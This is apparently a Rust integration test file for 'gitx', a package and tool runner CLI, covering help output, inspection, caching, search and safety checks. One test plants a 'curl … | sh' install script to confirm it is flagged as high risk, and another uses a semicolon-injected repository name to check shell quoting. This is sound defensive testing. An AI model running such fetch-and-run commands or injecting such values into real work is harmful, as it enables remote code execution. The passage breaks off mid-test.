use std::{
    io::{Read, Write},
    net::TcpListener,
    thread,
};

use assert_cmd::Command;
use predicates::prelude::*;

#[test]
fn help_lists_primary_commands() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("inspect"))
        .stdout(predicate::str::contains("run"))
        .stdout(predicate::str::contains("exec"))
        .stdout(predicate::str::contains("search"))
        .stdout(predicate::str::contains("update"))
        .stdout(predicate::str::contains("list"))
        .stdout(predicate::str::contains("remove"))
        .stdout(predicate::str::contains("cache"))
        .stdout(predicate::str::contains("doctor"))
        .stdout(predicate::str::contains("completion"))
        .stdout(predicate::str::contains("--color"))
        .stdout(predicate::str::contains("--verbose"))
        .stdout(predicate::str::contains("--progress"))
        .stdout(predicate::str::contains("npx").not());
}

#[test]
fn bare_command_shows_the_getting_started_help() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .assert()
        .success()
        .stdout(predicate::str::contains("Start here:"))
        .stdout(predicate::str::contains("github:owner/repo@v1.0.0"));
}

#[test]
fn inspect_local_manifest_human_output() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["inspect", "./fixtures/valid-node-tool"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "Source: ./fixtures/valid-node-tool",
        ))
        .stdout(predicate::str::contains("Runtime: node"))
        .stdout(predicate::str::contains("Entrypoint: src/main.js"))
        .stdout(predicate::str::contains("env: GITHUB_TOKEN"));
}

#[test]
fn inspect_local_manifest_json_output() {
    let output = Command::cargo_bin("gitx")
        .unwrap()
        .args(["inspect", "./fixtures/valid-node-tool", "--format", "json"])
        .output()
        .unwrap();

    assert!(output.status.success());

    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    assert_eq!(json["source"], "./fixtures/valid-node-tool");
    assert_eq!(json["schemaVersion"], 1);
    assert_eq!(json["sourceType"], "local");
    assert_eq!(json["toolName"], "repo-audit");
    assert_eq!(json["runtime"], "node");
    assert_eq!(json["entrypoint"], "src/main.js");
    assert_eq!(json["permissions"]["network"], true);
    assert_eq!(json["permissionEnforcement"], "none");
}

#[test]
fn verbose_steps_stay_on_stderr_when_inspect_emits_json() {
    let output = Command::cargo_bin("gitx")
        .unwrap()
        .args([
            "--verbose",
            "--color",
            "never",
            "inspect",
            "./fixtures/minimal-tool",
            "--format",
            "json",
        ])
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["toolName"], "minimal");
    assert!(!String::from_utf8_lossy(&output.stdout).contains("\u{1b}"));
    assert!(String::from_utf8_lossy(&output.stderr).contains(":: Inspecting"));
}

#[test]
fn inspect_json_schema_v1_matches_the_contract_fixture() {
    let output = Command::cargo_bin("gitx")
        .unwrap()
        .args(["inspect", "./fixtures/minimal-tool", "--format", "json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let mut actual: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    actual["manifestPath"] =
        serde_json::Value::String(actual["manifestPath"].as_str().unwrap().replace('\\', "/"));
    let expected: serde_json::Value =
        serde_json::from_str(include_str!("../fixtures/inspect-minimal-v1.json")).unwrap();

    assert_eq!(actual, expected);
}

#[test]
fn inspect_remote_ref_reports_unresolved_commit() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["inspect", "github:owner/repo@main"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "Remote: https://github.com/owner/repo.git",
        ))
        .stdout(predicate::str::contains("Ref: main"))
        .stdout(predicate::str::contains("Commit: unresolved"));
}

#[test]
fn inspect_invalid_manifest_fails_cleanly() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["inspect", "./fixtures/invalid-missing-entry"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("missing required field `entry`"));
}

#[test]
fn cache_list_uses_gitx_cache_dir() {
    let cache_dir = tempfile::tempdir().unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache_dir.path())
        .args(["cache", "list"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Cache root:"))
        .stdout(predicate::str::contains("NPM metadata entries: 0"));
}

#[test]
fn cache_remove_deletes_only_the_requested_package_record() {
    let cache = tempfile::tempdir().unwrap();
    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["cache", "list"])
        .assert()
        .success();
    let metadata = cache.path().join("npm/metadata/demo.json");
    std::fs::create_dir_all(metadata.parent().unwrap()).unwrap();
    std::fs::write(&metadata, "keep no longer").unwrap();
    let sentinel = cache.path().join("sentinel");
    std::fs::write(&sentinel, "keep me").unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .args(["cache", "remove", "demo"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Removed cached metadata demo"));

    assert!(!metadata.exists());
    assert_eq!(std::fs::read_to_string(sentinel).unwrap(), "keep me");
}

#[test]
fn cache_import_uses_an_exact_cached_record_without_network_access() {
    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    let npm_content = cache
        .path()
        .join("npm/backend-cache/_cacache/content-v2/sha512/9b/71")
        .join(&HELLO_SHA512_HEX[4..]);
    std::fs::create_dir_all(npm_content.parent().unwrap()).unwrap();
    std::fs::write(&npm_content, b"hello").unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .args([
            "--progress",
            "always",
            "cache",
            "import",
            "demo@1.2.3",
            "--from",
            "npm",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("npm: imported"))
        .stderr(predicate::str::contains("C---"))
        .stderr(predicate::str::contains(
            "Importing cached package tarball complete: 5 B / 5 B",
        ));

    let imported = cache
        .path()
        .join("npm/tarballs")
        .join(format!("sha512-{HELLO_SHA512_HEX}.tgz"));
    assert_eq!(std::fs::read(imported).unwrap(), b"hello");
}

#[test]
fn doctor_reports_known_tools() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .arg("doctor")
        .assert()
        .success()
        .stdout(predicate::str::contains("GitX doctor:"))
        .stdout(predicate::str::contains("git"))
        .stdout(predicate::str::contains("node"))
        .stdout(predicate::str::contains("npm"))
        .stdout(predicate::str::contains("deno"));
}

#[test]
fn completion_command_generates_a_bash_script() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["completion", "bash"])
        .assert()
        .success()
        .stdout(predicate::str::contains("_gitx()"))
        .stdout(predicate::str::contains(
            "complete -F _gitx -o bashdefault -o default gitx",
        ));
}

#[test]
fn legacy_cli_syntax_is_rejected() {
    for args in [
        vec!["x", "demo"],
        vec!["pkg", "demo"],
        vec!["package", "demo"],
        vec!["check", "./fixtures/minimal-tool"],
        vec!["installed", "list"],
        vec!["uninstall", "demo"],
        vec!["toolchains"],
        vec!["completions", "bash"],
        vec!["npx", "demo"],
        vec!["bunx", "demo"],
        vec!["dlx", "demo"],
    ] {
        let mut command = Command::cargo_bin("gitx").unwrap();
        command
            .args(args)
            .assert()
            .failure()
            .stderr(predicate::str::contains("unrecognized subcommand"));
    }
}

#[test]
fn legacy_flags_are_rejected() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["inspect", "./fixtures/minimal-tool", "--json"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("unexpected argument '--json'"));

    Command::cargo_bin("gitx")
        .unwrap()
        .args(["run", "./fixtures/minimal-tool", "--dry-run"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("unexpected argument '--dry-run'"));

    Command::cargo_bin("gitx")
        .unwrap()
        .args(["search", "demo", "--best"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("unexpected argument '--best'"));

    Command::cargo_bin("gitx")
        .unwrap()
        .args(["search", "demo", "--scope", "npm"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("unexpected argument '--scope'"));

    Command::cargo_bin("gitx")
        .unwrap()
        .args(["update", "demo", "--preview"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("unexpected argument '--preview'"));
}

#[test]
fn run_local_manifest_preview_shows_preflight() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args([
            "run",
            "./fixtures/minimal-tool",
            "--preview",
            "--",
            "--example",
        ])
        .assert()
        .success()
        .stderr(predicate::str::contains("GitX run preflight"))
        .stderr(predicate::str::contains("Tool: minimal"))
        .stderr(predicate::str::contains("Entrypoint: index.js"));
}

#[test]
fn preview_shortcut_shows_preflight() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["run", "./fixtures/minimal-tool", "-n"])
        .assert()
        .success()
        .stderr(predicate::str::contains("GitX run preflight"));
}

#[test]
fn preview_with_warnings_does_not_require_confirmation() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["run", "./fixtures/valid-node-tool", "--preview"])
        .assert()
        .success()
        .stderr(predicate::str::contains("Risk: medium"))
        .stderr(predicate::str::contains("Run? [y/N]").not());
}

#[test]
fn warned_run_requires_yes_when_stdin_is_not_interactive() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["run", "./fixtures/valid-node-tool"])
        .assert()
        .failure()
        .stderr(predicate::str::contains(
            "refusing to run without confirmation; pass --yes",
        ));
}

#[test]
fn list_uses_gitx_home() {
    let home = tempfile::tempdir().unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_HOME", home.path())
        .arg("list")
        .assert()
        .success()
        .stdout(predicate::str::contains("No tools installed."));
}

#[test]
fn remove_missing_tool_fails_cleanly() {
    let home = tempfile::tempdir().unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_HOME", home.path())
        .args(["remove", "missing-tool"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("`missing-tool` is not installed"));
}

#[test]
fn remove_rejects_path_like_names_without_touching_them() {
    let temp = tempfile::tempdir().unwrap();
    let home = temp.path().join("gitx-home");
    let victim = temp.path().join("victim");
    std::fs::write(&victim, "keep me").unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_HOME", &home)
        .args(["remove", victim.to_str().unwrap()])
        .assert()
        .failure()
        .stderr(predicate::str::contains("invalid installed tool name"));

    assert_eq!(std::fs::read_to_string(victim).unwrap(), "keep me");
}

#[test]
fn cache_clear_rejects_the_current_directory() {
    let temp = tempfile::tempdir().unwrap();
    let sentinel = temp.path().join("sentinel");
    std::fs::write(&sentinel, "keep me").unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .current_dir(temp.path())
        .env("GITX_CACHE_DIR", temp.path())
        .args(["cache", "clear"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("refusing unsafe cache root"));

    assert_eq!(std::fs::read_to_string(sentinel).unwrap(), "keep me");
}

#[test]
fn cache_clear_refuses_an_unmarked_directory() {
    let temp = tempfile::tempdir().unwrap();
    let sentinel = temp.path().join("sentinel");
    std::fs::write(&sentinel, "keep me").unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", temp.path())
        .args(["cache", "clear"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("valid GitX marker"));

    assert_eq!(std::fs::read_to_string(sentinel).unwrap(), "keep me");
}

#[test]
fn cache_clear_removes_a_marked_gitx_cache() {
    let temp = tempfile::tempdir().unwrap();
    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", temp.path())
        .args(["cache", "list"])
        .assert()
        .success();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", temp.path())
        .args(["cache", "clear"])
        .assert()
        .success();

    assert!(!temp.path().exists());
}

#[test]
fn dangerous_script_override_requires_lifecycle_script_permission() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["exec", "demo", "--allow-dangerous-scripts", "--preview"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("--allow-scripts"));
}

#[test]
fn exec_requires_a_package_for_an_explicit_bin() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["exec", "--bin", "demo", "--preview"])
        .assert()
        .failure()
        .stderr(predicate::str::contains(
            "--bin requires at least one --package",
        ));
}

#[test]
fn search_limit_is_checked_before_network_access() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["search", "formatter", "--limit", "0"])
        .assert()
        .failure()
        .stderr(predicate::str::contains(
            "limit must be a whole number from 1 to 20",
        ));
}

#[test]
fn search_installed_scope_prints_a_pinned_next_command() {
    let home = tempfile::tempdir().unwrap();
    seed_installed_npm_tool(home.path(), "demo-tool", "npm:demo@1.2.3", "npm:demo@1.2.3");
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_HOME", home.path())
        .args(["search", "demo", "--source", "installed", "--select", "1"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "demo-tool version unknown  [GitX install]",
        ))
        .stdout(predicate::str::contains(
            "origin: GitX managed install record on this device",
        ))
        .stdout(predicate::str::contains(
            "Run  gitx exec demo@1.2.3 -- <args>",
        ));
}

#[test]
fn installed_search_uses_record_metadata_for_matching_and_details() {
    let home = tempfile::tempdir().unwrap();
    seed_installed_npm_tool(home.path(), "demo-tool", "npm:demo@1.2.3", "npm:demo@1.2.3");
    let record_path = home.path().join("installed/demo-tool.json");
    let mut record: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&record_path).unwrap()).unwrap();
    record["description"] = serde_json::json!("Team handbook formatter");
    record["homepage"] = serde_json::json!("https://example.test/demo");
    record["license"] = serde_json::json!("MIT");
    record["binaries"] = serde_json::json!(["demo", "demo-format"]);
    record["metadata"] = serde_json::json!({"repository": "acme/demo"});
    std::fs::write(&record_path, serde_json::to_vec_pretty(&record).unwrap()).unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_HOME", home.path())
        .args([
            "search",
            "handbook",
            "--source",
            "installed",
            "--details",
            "1",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "Description: Team handbook formatter",
        ))
        .stdout(predicate::str::contains(
            "Homepage: https://example.test/demo",
        ))
        .stdout(predicate::str::contains("License: MIT"))
        .stdout(predicate::str::contains("Binaries: demo, demo-format"))
        .stdout(predicate::str::contains("Metadata.repository: acme/demo"));
}

#[test]
fn search_cache_scope_uses_only_local_exact_version_records() {
    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["cache", "list"])
        .assert()
        .success();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .args(["search", "demo", "--source", "cache", "--select", "1"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "demo 1.2.3  [GitX package cache]  ? unknown",
        ))
        .stdout(predicate::str::contains(
            "origin: GitX exact-version package metadata cache on this device",
        ))
        .stdout(predicate::str::contains(
            "Inspect  gitx inspect npm:demo@1.2.3",
        ));
}

#[test]
fn search_project_scope_finds_local_node_bins_without_network_access() {
    let project = tempfile::tempdir().unwrap();
    let bin = project.path().join("node_modules/.bin/demo-tool");
    std::fs::create_dir_all(bin.parent().unwrap()).unwrap();
    std::fs::write(&bin, "#!/bin/sh\nexit 0\n").unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args([
            "search",
            "demo",
            "--source",
            "project",
            "--project",
            project.path().to_str().unwrap(),
            "--select",
            "1",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "demo-tool version unknown  [project bin]  ✓ compatible",
        ))
        .stdout(predicate::str::contains("origin: project directory"))
        .stdout(predicate::str::contains("-- <args>"));
}

#[test]
fn search_color_modes_keep_structured_output_script_safe() {
    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["cache", "list"])
        .assert()
        .success();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["--color", "always", "search", "demo", "--source", "cache"])
        .assert()
        .success()
        .stdout(predicate::str::contains("\x1b[1;35m::\x1b[0m"))
        .stdout(predicate::str::contains("[GitX package cache]"))
        .stdout(predicate::str::contains(
            "GitX exact-version package metadata cache on this device",
        ));

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["search", "demo", "--color", "never", "--source", "cache"])
        .assert()
        .success()
        .stdout(predicate::str::contains("\x1b[").not())
        .stdout(predicate::str::contains(
            "demo 1.2.3  [GitX package cache]  ? unknown",
        ));
}

#[test]
fn search_json_is_never_colored() {
    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["cache", "list"])
        .assert()
        .success();

    let output = Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args([
            "--color", "always", "search", "demo", "--source", "cache", "--format", "json",
        ])
        .output()
        .unwrap();

    assert!(output.status.success());
    assert!(!String::from_utf8_lossy(&output.stdout).contains("\x1b["));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["results"][0]["name"], "demo");
}

#[test]
fn interactive_search_requires_a_terminal() {
    let home = tempfile::tempdir().unwrap();
    seed_installed_npm_tool(home.path(), "demo-tool", "npm:demo@1.2.3", "npm:demo@1.2.3");
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_HOME", home.path())
        .args(["search", "demo", "--source", "installed", "--interactive"])
        .assert()
        .failure()
        .stderr(predicate::str::contains(
            "--interactive requires a terminal; use --select <selection> in scripts",
        ));
}

#[test]
fn search_details_and_json_expose_metadata_without_network_access() {
    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    let record_path = cache.path().join("npm/versions/demo/1.2.3.json");
    let mut record: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&record_path).unwrap()).unwrap();
    record["metadata"]["homepage"] = serde_json::json!("https://example.test/demo");
    record["metadata"]["license"] = serde_json::json!("MIT");
    record["metadata"]["engines"] = serde_json::json!({"node": ">=20"});
    std::fs::write(&record_path, serde_json::to_vec_pretty(&record).unwrap()).unwrap();
    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["cache", "list"])
        .assert()
        .success();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["search", "demo", "--source", "cache", "--details", "1"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Source: GitX package cache"))
        .stdout(predicate::str::contains("Compatibility on"))
        .stdout(predicate::str::contains(
            "Homepage: https://example.test/demo",
        ))
        .stdout(predicate::str::contains("License: MIT"))
        .stdout(predicate::str::contains("Requires: node >=20"))
        .stdout(predicate::str::contains(
            "Inspect: gitx inspect npm:demo@1.2.3",
        ));

    let output = Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["search", "demo", "--source", "cache", "--format", "json"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["schemaVersion"], 2);
    assert_eq!(json["results"][0]["name"], "demo");
    assert_eq!(
        json["results"][0]["origin"],
        "GitX exact-version package metadata cache on this device"
    );
    assert_eq!(json["results"][0]["compatibility"]["status"], "unknown");
    assert_eq!(json["results"][0]["homepage"], "https://example.test/demo");
    assert_eq!(
        json["results"][0]["compatibility"]["requirements"][0],
        "node >=20"
    );
}

#[test]
fn offline_search_skips_default_network_providers_but_keeps_local_results() {
    let home = tempfile::tempdir().unwrap();
    seed_installed_npm_tool(home.path(), "demo-tool", "npm:demo@1.2.3", "npm:demo@1.2.3");

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_HOME", home.path())
        .args(["search", "demo", "--offline"])
        .assert()
        .success()
        .stdout(predicate::str::contains("demo-tool"))
        .stdout(predicate::str::contains("offline mode skipped"));

    Command::cargo_bin("gitx")
        .unwrap()
        .args(["search", "demo", "--source", "npm", "--offline"])
        .assert()
        .failure()
        .stderr(predicate::str::contains(
            "--offline cannot search remote source",
        ));
}

#[test]
fn configured_file_catalog_is_searchable_offline_with_record_provenance() {
    let directory = tempfile::tempdir().unwrap();
    let config = directory.path().join("catalogs.toml");
    let records = directory.path().join("company-tools.json");
    std::fs::write(
        &config,
        r#"version = 1

[[catalog]]
id = "company-tools"
label = "Company tool snapshot"
kind = "file"
path = "company-tools.json"
format = "json"
origin = "company mirror snapshot"
action = ["toolctl", "install", "{name}"]
"#,
    )
    .unwrap();
    std::fs::write(
        &records,
        r#"[{"name":"unmistakable-widget","version":"4.2.0","description":"internal widget","origin":"mirror revision 0123456","information":{"Owner":"Platform"}}]"#,
    )
    .unwrap();

    let output = Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CATALOG_CONFIG", &config)
        .args([
            "search",
            "unmistakable",
            "--source",
            "cache",
            "--catalog",
            "company-tools",
            "--offline",
            "--format",
            "json",
        ])
        .output()
        .unwrap();
    assert!(output.status.success());

    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["catalogs"], serde_json::json!(["company-tools"]));
    assert_eq!(json["results"][0]["name"], "unmistakable-widget");
    assert_eq!(json["results"][0]["origin"], "mirror revision 0123456");
    assert_eq!(
        json["results"][0]["action"]["command"],
        "toolctl install unmistakable-widget"
    );
}

#[test]
fn offline_and_device_modes_refuse_configured_command_catalogs() {
    let directory = tempfile::tempdir().unwrap();
    let config = directory.path().join("catalogs.toml");
    std::fs::write(
        &config,
        r#"version = 1

[[catalog]]
id = "network-index"
kind = "command"
command = ["this-command-must-not-run", "{query}"]
action = ["toolctl", "install", "{name}"]
"#,
    )
    .unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CATALOG_CONFIG", &config)
        .args([
            "search",
            "anything",
            "--source",
            "cache",
            "--catalog",
            "network-index",
            "--offline",
        ])
        .assert()
        .failure()
        .stderr(predicate::str::contains(
            "cannot be used with --offline or --device",
        ));
}

#[test]
fn device_mode_rejects_mixed_remote_source_selection() {
    Command::cargo_bin("gitx")
        .unwrap()
        .args(["search", "anything", "--device", "--source", "npm"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with '--source"));
}

#[test]
fn search_help_exposes_device_and_catalog_controls() {
    Command::cargo_bin("gitx")
        .unwrap()
        .args(["search", "--help"])
        .assert()
        .success()
        .stdout(predicate::str::contains("--device"))
        .stdout(predicate::str::contains("device-only"))
        .stdout(predicate::str::contains("--catalog"))
        .stdout(predicate::str::contains("npm-global"))
        .stdout(predicate::str::contains("flatpak"));
}

#[test]
fn remote_catalog_adapters_return_provider_details_and_actions() {
    assert_remote_catalog_search(
        "github",
        "GITX_GITHUB_API",
        r#"{"items":[{"full_name":"acme/tool","description":"GitHub tool","html_url":"https://github.com/acme/tool","default_branch":"main","updated_at":"2026-08-20T12:00:00Z","stargazers_count":9,"forks_count":2,"language":"Rust","archived":false}]}"#,
        "Source: GitHub repository",
        "Inspect: gitx inspect github:acme/tool@main",
    );
    assert_remote_catalog_search(
        "gitlab",
        "GITX_GITLAB_API",
        r#"[{"path_with_namespace":"acme/tool","description":"GitLab tool","web_url":"https://gitlab.com/acme/tool","default_branch":"main","last_activity_at":"2026-08-20T12:00:00Z","star_count":7,"forks_count":1,"archived":false}]"#,
        "Source: GitLab repository",
        "Inspect: gitx inspect gitlab:acme/tool@main",
    );
    assert_remote_catalog_search(
        "codeberg",
        "GITX_CODEBERG_API",
        r#"{"data":[{"full_name":"acme/tool","description":"Codeberg tool","html_url":"https://codeberg.org/acme/tool","default_branch":"main","updated_at":"2026-08-20T12:00:00Z","stars_count":5,"forks_count":1,"language":"Rust","archived":false}]}"#,
        "Source: Codeberg repository",
        "Inspect: gitx inspect codeberg:acme/tool@main",
    );
    assert_remote_catalog_search(
        "aur",
        "GITX_AUR_RPC",
        r#"{"type":"search","version":5,"resultcount":1,"results":[{"Name":"acme-tool","Version":"1.2.3-1","Description":"AUR tool","URL":"https://example.test/acme-tool","NumVotes":5,"Popularity":1.25,"OutOfDate":null,"Maintainer":"acme","LastModified":1}]}"#,
        "Source: Arch User Repository",
        "Open: https://aur.archlinux.org/packages/acme-tool",
    );
    assert_remote_catalog_search(
        "bun",
        "BUN_CONFIG_REGISTRY",
        r#"{"objects":[{"package":{"name":"acme-tool","version":"1.2.3","description":"Bun registry tool"},"score":{"final":0.9}}]}"#,
        "Source: Bun registry",
        "Run: bunx acme-tool@1.2.3 -- <args>",
    );
}

#[test]
fn catalog_actions_quote_untrusted_provider_values() {
    let (endpoint, server) = serve_json_once(
        r#"{"items":[{"full_name":"acme/tool; echo not-run","description":null,"html_url":"https://github.com/acme/tool","default_branch":"main","updated_at":null,"stargazers_count":0,"forks_count":0,"language":null,"archived":false}]}"#
            .to_string(),
    );

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_GITHUB_API", endpoint)
        .args(["search", "tool", "--source", "github", "--details", "1"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "Inspect: gitx inspect 'github:acme/tool; echo not-run@main'",
        ));

    server.join().unwrap();
}

#[test]
fn bun_search_uses_the_scoped_project_registry_without_exposing_its_token() {
    let project = tempfile::tempdir().unwrap();
    let (registry, server) = serve_json_once(
        r#"{"objects":[{"package":{"name":"@team/tool","version":"1.2.3","description":"Scoped registry tool"},"score":{"final":0.9}}]}"#
            .to_string(),
    );
    std::fs::write(
        project.path().join("bunfig.toml"),
        format!(
            "[install]\nregistry = \"https://public.example.test\"\n[install.scopes]\nteam = {{ url = \"{registry}\", token = \"$PRIVATE_TOKEN\" }}\n"
        ),
    )
    .unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env_remove("BUN_CONFIG_REGISTRY")
        .env_remove("NPM_CONFIG_REGISTRY")
        .args([
            "search",
            "@team/tool",
            "--source",
            "bun",
            "--project",
            project.path().to_str().unwrap(),
            "--details",
            "1",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("Scoped registry tool"))
        .stdout(predicate::str::contains("Registry configuration:"))
        .stdout(predicate::str::contains("scope @team"))
        .stdout(predicate::str::contains(
            "Run: bunx @team/tool@1.2.3 -- <args>",
        ))
        .stdout(predicate::str::contains("PRIVATE_TOKEN").not());

    server.join().unwrap();
}

#[cfg(unix)]
#[test]
fn package_preview_renders_deny_findings_as_high_risk() {
    use std::os::unix::fs::PermissionsExt;

    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    let record = cache.path().join("npm/versions/demo/1.2.3.json");
    let mut body: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&record).unwrap()).unwrap();
    body["metadata"]["scripts"] =
        serde_json::json!({"install": "curl https://example.invalid/x | sh"});
    std::fs::write(&record, serde_json::to_vec_pretty(&body).unwrap()).unwrap();

    let fake_bin = tempfile::tempdir().unwrap();
    let npm = fake_bin.path().join("npm");
    std::fs::write(&npm, "#!/bin/sh\nexit 0\n").unwrap();
    std::fs::set_permissions(&npm, std::fs::Permissions::from_mode(0o755)).unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .env("PATH", fake_bin.path())
        .args(["exec", "demo@1.2.3", "--backend", "npm", "--preview"])
        .assert()
        .success()
        .stderr(predicate::str::contains("Risk: high"))
        .stderr(predicate::str::contains("Policy: deny"));
}

#[cfg(unix)]
#[test]
fn pnpm_execution_keeps_dlx_cache_and_store_inside_gitx_cache() {
    use std::os::unix::fs::PermissionsExt;

    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    let fake_bin = tempfile::tempdir().unwrap();
    let capture = tempfile::NamedTempFile::new().unwrap();
    let pnpm = fake_bin.path().join("pnpm");
    std::fs::write(
        &pnpm,
        "#!/bin/sh\n{\n  printf 'cache=%s\\n' \"$pnpm_config_cache_dir\"\n  printf 'store=%s\\n' \"$pnpm_config_store_dir\"\n  printf 'args=%s\\n' \"$*\"\n} > \"$CAPTURE\"\n",
    )
    .unwrap();
    std::fs::set_permissions(&pnpm, std::fs::Permissions::from_mode(0o755)).unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .env("PATH", fake_bin.path())
        .env("CAPTURE", capture.path())
        .args(["exec", "demo@1.2.3", "--backend", "pnpm", "--yes"])
        .assert()
        .success();

    let backend_cache = cache.path().join("npm/backend-cache");
    assert_eq!(
        std::fs::read_to_string(capture.path()).unwrap(),
        format!(
            "cache={}\nstore={}\nargs=--config.ignore-scripts=true dlx demo@1.2.3\n",
            backend_cache.display(),
            backend_cache.join("pnpm-store").display(),
        )
    );
}

#[cfg(all(unix, target_os = "linux"))]
#[test]
fn package_platform_mismatch_is_visible_in_preview_and_blocks_execution() {
    use std::os::unix::fs::PermissionsExt;

    let cache = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    let record = cache.path().join("npm/versions/demo/1.2.3.json");
    let mut body: serde_json::Value =
